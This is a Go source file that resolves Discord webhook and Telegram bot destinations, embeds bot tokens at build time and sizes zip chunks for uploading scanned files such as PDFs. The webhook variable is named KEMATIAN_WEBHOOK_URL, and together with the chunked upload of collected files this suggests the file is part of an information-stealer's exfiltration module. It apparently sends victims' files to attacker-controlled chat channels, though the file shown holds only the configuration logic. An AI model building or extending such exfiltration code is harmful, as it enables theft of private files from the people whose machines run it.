// upload_config.go — resolves Discord/Telegram destinations and size limits.
//
// Precedence for each field: CLI flag → environment variable → build-time default.
// At least one destination must be configured (Discord webhook OR Telegram token+chat).
package main

import (
	"os"
	"strings"
)

// Build-time defaults (optional):
//
//	-ldflags "-X main.defaultTelegramBotToken=... -X main.defaultTelegramChatID=..."
var defaultTelegramBotToken string
var defaultTelegramChatID string

// uploadConfig holds runtime upload destinations after flag/env/default resolution.
type uploadConfig struct {
	DiscordWebhook   string
	TelegramBotToken string
	TelegramChatID   string
}

// resolveUploadConfig merges flag, env, and ldflags values into a usable config.
func resolveUploadConfig(webhookFlag, telegramTokenFlag, telegramChatFlag string) uploadConfig {
	cfg := uploadConfig{
		DiscordWebhook:   strings.TrimSpace(webhookFlag),
		TelegramBotToken: strings.TrimSpace(telegramTokenFlag),
		TelegramChatID:   strings.TrimSpace(telegramChatFlag),
	}

	if cfg.DiscordWebhook == "" {
		cfg.DiscordWebhook = strings.TrimSpace(os.Getenv("DISCORD_WEBHOOK_URL"))
	}
	if cfg.DiscordWebhook == "" {
		cfg.DiscordWebhook = strings.TrimSpace(os.Getenv("KEMATIAN_WEBHOOK_URL"))
	}
	if cfg.DiscordWebhook == "" {
		cfg.DiscordWebhook = strings.TrimSpace(defaultWebhook)
	}

	if cfg.TelegramBotToken == "" {
		cfg.TelegramBotToken = strings.TrimSpace(os.Getenv("TELEGRAM_BOT_TOKEN"))
	}
	if cfg.TelegramBotToken == "" {
		cfg.TelegramBotToken = strings.TrimSpace(defaultTelegramBotToken)
	}

	if cfg.TelegramChatID == "" {
		cfg.TelegramChatID = strings.TrimSpace(os.Getenv("TELEGRAM_CHAT_ID"))
	}
	if cfg.TelegramChatID == "" {
		cfg.TelegramChatID = strings.TrimSpace(defaultTelegramChatID)
	}

	return cfg
}

func (c uploadConfig) useDiscord() bool {
	return c.DiscordWebhook != ""
}

func (c uploadConfig) useTelegram() bool {
	return c.TelegramBotToken != "" && c.TelegramChatID != ""
}

func (c uploadConfig) valid() bool {
	return c.useDiscord() || c.useTelegram()
}

// maxChunkBytes is the per-zip size budget. Discord is the tighter constraint
// when both destinations are enabled, so we always use its limit in that case.
func (c uploadConfig) maxChunkBytes() int {
	if c.useDiscord() {
		return maxDiscordUpload
	}
	return maxTelegramUpload
}

// maxScannedFileBytes caps a single phase-2 file so one huge PDF cannot force
// an entire zip over the channel limit.
func (c uploadConfig) maxScannedFileBytes() int64 {
	if c.useDiscord() {
		return int64(maxScannedFileUploadSize)
	}
	return int64(maxTelegramUpload - 3*1024*1024)
}